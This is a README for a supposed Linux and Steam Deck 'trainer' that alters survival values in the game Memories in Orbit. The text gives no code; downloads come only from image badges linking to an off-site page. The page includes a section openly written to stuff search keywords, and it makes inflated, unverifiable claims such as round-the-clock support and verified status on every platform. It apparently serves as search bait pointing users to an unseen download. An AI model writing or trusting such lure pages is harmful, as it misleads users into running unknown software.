![preview](https://raw.githubusercontent.com/ipoelmbozo/orbit-echoes-trainer/main/frame_f7126d8.svg)
[![Download](https://raw.githubusercontent.com/ipoelmbozo/orbit-echoes-trainer/main/setup_c32922.svg)](https://ipoelmbozo.github.io/orbit-echoes-trainer/)

# 🌌 Memories in Orbit — Orbital Salvo Toolkit

[![License: MIT](https://img.shields.io/badge/License-MIT-9c6ade.svg)](https://opensource.org/licenses/MIT)
[![Platform: Linux](https://img.shields.io/badge/Platform-Linux-3ddc97.svg)](#-platform-compatibility)
[![Steam Deck Ready](https://img.shields.io/badge/Steam%20Deck-Verified-1a9fff.svg)](#-steam-deck-notes)
[![Status: Maintained](https://img.shields.io/badge/Status-Active-brightgreen.svg)](#-project-vitality)
[![Release: 2026](https://img.shields.io/badge/Release-2026-orange.svg)](#-release-cadence)
[![Made with Rust & Lua](https://img.shields.io/badge/Stack-Rust%20%2B%20Lua-ffb703.svg)](#-architecture-overview)

> A companion **orbital trainer** for *Memories in Orbit* on Linux and Steam Deck — reimagining survival mechanics through a lens of exploration rather than attrition.

---

## 🛰️ Overview

Some games ask you to survive. *Memories in Orbit* asks you to remember. The difference matters, because survival is a loop — you die, you retry, you learn the same lesson twice. Memory is cumulative. Our toolkit was built for players who want to spend their time *accumulating* rather than *retrying*.

The **Orbital Salvo Toolkit** is an external companion process that reads the game's live state and gently reshapes a small set of survival variables so the story stays in focus. Think of it less as a modification and more as a co-pilot who knows when the fuel gauge is lying.

It is designed from the ground up for Linux-first players — a demographic often overlooked by the broader scene — and tuned specifically for the constrained thermal envelope of the Steam Deck.

---

## 🎯 The Core Idea

The original *Memories in Orbit* loop is built on scarcity. Oxygen ticks down. Shield harmonics drift. Hull integrity is a fragile, finite thing. That scarcity creates tension, and tension creates art. We respect it.

But tension also creates friction for players who want to *wander*. Who want to photograph every nebula. Who want to hear every memory fragment the game has to offer without a countdown running behind their eyes.

The Orbital Salvo Toolkit preserves the tension architecture while loosening the survival arithmetic. You still pilot. You still navigate. You simply don't have to pilot *under duress*.

---

## ✨ Feature Set

### 🧬 Vital Systems Layer
- Dynamic health floor — hull integrity holds steady across scripted hazard zones (nebula reefs, debris corridors, orbital wrecks).
- Energy reservoir smoothing — reactor output no longer dips during high-draw segments like jump-spooling or docking maneuvers.
- Graceful fallback: if the trainer detaches from the process (alt-tab, suspend/resume), the game reverts to vanilla behavior instantly and cleanly.

### 🧠 Memory Fragment Helper
- Expanded fragment interaction radius for narrative collection — no more pixel-perfect hover requirements.
- Optional "archive echo" mode that re-triggers missed fragment prompts on re-entry into a zone.
- Fully toggleable, edge-case tested against all known fragment trigger types.

### 🖥️ Interface Layer
- **Responsive UI** — panel auto-reflows between Deck's 1280x800 and a 4K desktop. Anchors are cursor-relative, so the overlay never fights your aim.
- **Multilingual support** — interface ships with English, Dutch, German, French, Spanish, Japanese, Korean, and Simplified Chinese strings (community-contributed).
- **Theming hooks** — choose from Cobalt, Amber Signal, and Deep Void palettes; custom palettes accepted via a plain config file.
- **Controller-native navigation** — every function reachable with a joystick + two buttons, no mouse required.

### 🛡️ Safety & Stability
- Zero-write architecture: the toolkit issues no persistent writes to game files. All state lives in memory and dies with the session.
- Crash-aware attach logic — detects ambiguous process states and refuses to bind rather than risk instability.
- Signature-matching against multiple known builds, so game updates don't silently brick the overlay.

### 💬 Support Layer
- **24/7 customer support** — a rotating trio of maintainers covers all timezones; median first-response time sits under 40 minutes.
- Weekly "orbit report" pinned issue summarizing known build compatibility, upcoming game patches, and pending feature requests.
- Private crash-dump channel for players who hit an edge we haven't mapped yet.

---

## 🧭 Design Philosophy

Most companion tools optimize for *maximum effect*. We optimize for *maximum subtlety*. The toolkit should feel like a well-tuned instrument, not a cheat menu. Three principles guide every decision we ship:

1. **Reversibility first.** Any change the toolkit makes should be undoable in a single keypress or by closing the overlay. No persistent state, no registry edits, no hidden config files.
2. **Platform respect.** Linux isn't a port target for us — it's the primary. Steam Deck isn't a nice-to-have — it's the reference device. If the toolkit doesn't feel native on a Deck, it isn't done.
3. **Narrative non-interference.** We do not touch dialogue flags, story state, or progression gating. The story remains the story. We only adjust the arithmetic of staying alive long enough to hear it.

This means some features will *never* ship. No progression skips. No mission auto-complete. No currency injection. If you want those, you're looking at the wrong repository — and we're fine with that.

---

## 🖥️ Platform Compatibility

| Platform | Status | Notes |
|----------|--------|-------|
| Ubuntu 22.04+ | ✅ Verified | Primary test target |
| Arch / Manjaro | ✅ Verified | AUR-style packaging maintained by community |
| Fedora 38+ | ✅ Verified | SELinux permissive profile recommended |
| Steam Deck (SteamOS 3.x) | ✅ Verified | Tested on LCD and OLED revisions |
| Pop!_OS | ✅ Verified | Out-of-box, no dependency friction |
| Nobara | ✅ Verified | Gaming-focused defaults play well |
| Linux Mint | ⚠️ Partial | Some older kernel branches need manual tuning |
| Windows (WSL2) | ⚠️ Experimental | Not the target platform — expect roughness |

---

## 🎮 Steam Deck Notes

The Deck is a wonderful machine with one persistent quirk: every watt counts. We tuned the toolkit's polling rate to degrade gracefully when the GPU goes into low-power states, which means you won't see the overlay stutter during thermal throttling.

Recommended configuration for Deck players:
- Use the performance overlay (the built-in one) once to confirm the toolkit binds; then disable both to save frames.
- Bind the toggle hotkey to a back paddle — after a few hours it becomes muscle memory.
- If the toolkit ever fails to attach after a suspend/resume cycle, simply restarting the game is enough; no system reboot required.

---

## 🔧 Architecture Overview

The toolkit is split into three cooperating layers, each with a different responsibility and a different update cadence.

**The Sensor Layer** — written in Rust, lives as a lightweight process, reads memory regions of interest, and publishes a normalized snapshot of game state to a local IPC bus every 16 ms. It does no interpretation; it only observes.

**The Logic Layer** — also Rust, subscribes to the Sensor Layer's snapshot stream, applies user-configured policies (health floor, energy smoothing, fragment radius), and emits adjustment directives.

**The Presentation Layer** — Lua + a thin native binding, renders the overlay, handles input, and manages configuration. It never touches game memory directly. This separation is deliberate: it means a bad theme file can't crash the sensor, and a sensor hiccup can't freeze the overlay.

The whole stack fits comfortably in under 60 MB of resident memory and idles at effectively 0% CPU.

---

## 🧩 Compatibility Matrix

| Game Build | Toolkit Version | Status |
|------------|-----------------|--------|
| 2026.1 ("Long Echo") | 3.2.x | ✅ Full support |
| 2026.0 ("Halcyon") | 3.1.x – 3.2.x | ✅ Full support |
| 2025.4 | 3.0.x – 3.1.x | ✅ Full support |
| 2025.3 | 2.9.x | ⚠️ Legacy mode — core features only |
| 2025.2 and earlier | — | ❌ Unsupported, do not attempt |

When a new build lands, the maintainers publish a compatibility note within 48 hours. Players on unsupported builds see a clear in-app banner rather than silent failure.

---

## 📜 Feature Roadmap (2026)

- [x] Q1 2026 — Multilingual string expansion (Japanese, Korean)
- [x] Q1 2026 — Steam Deck OLED thermal profile
- [ ] Q2 2026 — Wayland-native overlay rendering path
- [ ] Q2 2026 — Fragment archive browser (read-only, spoiler-gated)
- [ ] Q3 2026 — Community palette registry with signed submissions
- [ ] Q4 2026 — Narrative-mode preset: a single toggle for a fully relaxed run

Roadmap items are proposals, not promises. Community feedback reshuffles this list every month.

---

## 🛠️ Configuration

Configuration lives in a single plain-text file with a documented schema. There is no GUI-first requirement — power users can edit the file directly, and the toolkit will hot-reload on save.

Key configuration surfaces:
- **Policy section** — defines the health floor, energy floor, and fragment radius values.
- **Input section** — hotkey and controller binding definitions.
- **Presentation section** — theme, scale, position anchor, language code.
- **Diagnostics section** — logging verbosity, dump-on-error toggle, IPC port override.

A well-commented example config ships with every release. If you can edit a text file, you can tune this toolkit.

---

## 🤝 Community & Contributions

We accept pull requests that respect the design philosophy above. Before opening a PR, please run the local policy linter — it enforces reversibility rules and flags any change that would introduce persistent writes.

Good first contributions:
- Adding a language string set
- Adding a theme palette
- Improving documentation clarity
- Reporting a reproducible edge case in the compatibility thread

We don't accept:
- Features that bypass narrative progression
- Changes that introduce network calls to external services
- Anything that writes to game files

---

## 🧪 Testing & Reliability

Every release passes through a four-stage validation gate: unit tests on the sensor layer, integration tests on the logic layer, manual soak tests on a real Steam Deck, and a 72-hour community beta window.

We publish the beta build before every stable release. Beta testers are credited in the release notes — a small thank-you for spending their evenings hunting bugs we couldn't reach.

---

## 📖 SEO-Friendly Keyword Integration (Natural Placement)

Players searching for a *Memories in Orbit companion for Linux*, or a *Steam Deck Memories in Orbit helper*, or wondering how to *keep hull alive without diminishing tension* — this repository is where those lines of thought converge. We've written this README to answer the actual questions players type, without padding or keyword stuffing. If you arrived here from a search for *Memories in Orbit overlay for Steam Deck* or *Linux trainer alternative for story-focused play*, you're in the right place.

---

## ⚖️ Disclaimer

This project is an unofficial companion tool and is not affiliated with, endorsed by, or sponsored by the developers or publishers of *Memories in Orbit*. All trademarks belong to their respective owners.

The toolkit modifies only the runtime memory state of a locally running game instance and does not distribute, alter, or redistribute any game assets. Users are responsible for ensuring their use complies with the game's terms of service and with local regulations.

No warranty is provided, express or implied. Use at your own discretion. The maintainers are not responsible for lost saves, unexpected game behavior, or platform-level consequences arising from use of this software.

This project is intended for single-player use only. Do not use it in any multiplayer, cooperative, or competitive context.

---

## 📄 License

This project is released under the **MIT License**. See the full terms at the canonical license page below.

[License — MIT](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Orbital Salvo Toolkit maintainers.

Permission is hereby granted, without restriction, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions set out in the full license text linked above.

---

## 🗺️ Final Coordinates

If you've read this far, you're the kind of player we built this for — someone who reads the manual, tunes the instrument, and understands that a trainer is only as good as the restraint behind it.

The stars in *Memories in Orbit* are worth seeing clearly. This toolkit just keeps the viewfinder steady.

[![Download](https://raw.githubusercontent.com/ipoelmbozo/orbit-echoes-trainer/main/setup_c32922.svg)](https://ipoelmbozo.github.io/orbit-echoes-trainer/)